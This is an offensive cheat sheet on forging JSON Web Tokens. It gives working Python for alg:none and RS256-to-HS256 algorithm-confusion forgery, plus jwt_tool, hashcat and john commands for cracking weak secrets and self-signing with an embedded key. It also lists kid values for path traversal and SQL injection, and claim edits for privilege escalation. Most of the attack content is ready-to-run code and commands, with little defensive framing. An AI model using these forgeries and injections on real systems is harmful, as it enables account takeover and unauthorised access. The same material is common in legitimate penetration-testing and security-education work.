# JWT attack techniques

JSON Web Tokens are used for authentication and authorisation in web applications and
APIs. Several classes of implementation vulnerability allow token forgery without
knowing the signing key.

## Algorithm confusion (alg:none and RS256 to HS256)

The most impactful JWT vulnerability: if the library trusts the `alg` header from
the token itself, an attacker can change the algorithm to bypass verification.

`alg:none`, some libraries accept unsigned tokens:

```python
import base64, json

# decode a real JWT to get the header and payload structure
token = "eyJhbGc..."
parts = token.split('.')
header = json.loads(base64.b64decode(parts[0] + '=='))
payload = json.loads(base64.b64decode(parts[1] + '=='))

# forge: set alg to none and modify the payload
header['alg'] = 'none'
payload['role'] = 'admin'

def b64_nopad(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

forged = f"{b64_nopad(header)}.{b64_nopad(payload)}."
print(forged)
```

RS256 to HS256, if the server uses RS256 (asymmetric), its public key is often
accessible. Changing `alg` to HS256 and signing with the public key as the HMAC
secret tricks a vulnerable library into verifying with the public key:

```python
import jwt, requests

# retrieve or extract the server's public key
# often at /.well-known/jwks.json or /api/auth/keys
r = requests.get('https://target.example.com/.well-known/jwks.json')
jwks = r.json()

# convert JWK to PEM (use python-jose or cryptography library)
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

# ... extract n and e from JWKS, construct public key, export as PEM
public_key_pem = b"-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----\n"

# forge token signed with public key as HMAC secret
forged_payload = {'user': 'admin', 'role': 'administrator'}
forged_token = jwt.encode(forged_payload, public_key_pem, algorithm='HS256')
```

## jwt_tool for automated attack

```text
pip install jwt_tool

# decode and display a token
jwt_tool TARGET_JWT

# test for alg:none
jwt_tool TARGET_JWT -X a

# RS256 to HS256 algorithm confusion (requires public key)
jwt_tool TARGET_JWT -X k -pk server_public.pem

# brute force weak HMAC secret
jwt_tool TARGET_JWT -C -d /usr/share/wordlists/rockyou.txt

# inject claims and re-sign (if secret is known or none)
jwt_tool TARGET_JWT -I -pc role -pv admin
```

## Weak secret brute force

HS256/HS384/HS512 tokens signed with a weak or default secret can be cracked offline:

```text
# hashcat mode 16500 for JWT
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt --format=HMAC-SHA256
```

Common weak secrets: `secret`, `password`, `jwt`, the application name, `changeme`,
empty string. Try these manually before running a full wordlist.

## Key confusion with public key injection (CVE-pattern)

Some implementations allow the token to embed a JWK in the header (`jwk` or `kid`
parameter) and verify against it. This allows an attacker to self-sign tokens with
their own key:

```python
# generate an RSA key pair
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = key.public_key()

# embed the public key in the JWT header and sign with the private key
# use jwt_tool: jwt_tool TARGET_JWT -X s
```

```text
jwt_tool TARGET_JWT -X s
```

## kid path traversal

The `kid` (key ID) header parameter is used by some libraries to look up the signing
key from a key store. If this value is used in a file path or database query without
sanitisation:

```text
# kid pointing to /dev/null (empty key, sign with empty string)
jwt_tool TARGET_JWT -I -hc kid -hv "../../dev/null"

# kid as SQL injection
jwt_tool TARGET_JWT -I -hc kid -hv "x' UNION SELECT 'attacker_secret' -- "
```

These depend heavily on the implementation. Test both with jwt_tool's tamper mode.

## Claim manipulation

Once a valid signing method is compromised, the common modifications are:

- `exp`: set to far future to avoid expiry checks
- `iat`: set to past to appear as an old valid token
- `role`, `admin`, `is_admin`, `group`: escalate privileges
- `sub`, `user_id`, `userId`: change identity to another user or admin account
- `scope`: expand API access (OAuth2 tokens)

Always check what claims the application actually validates; some applications issue
tokens with privilege claims that are never checked server-side.
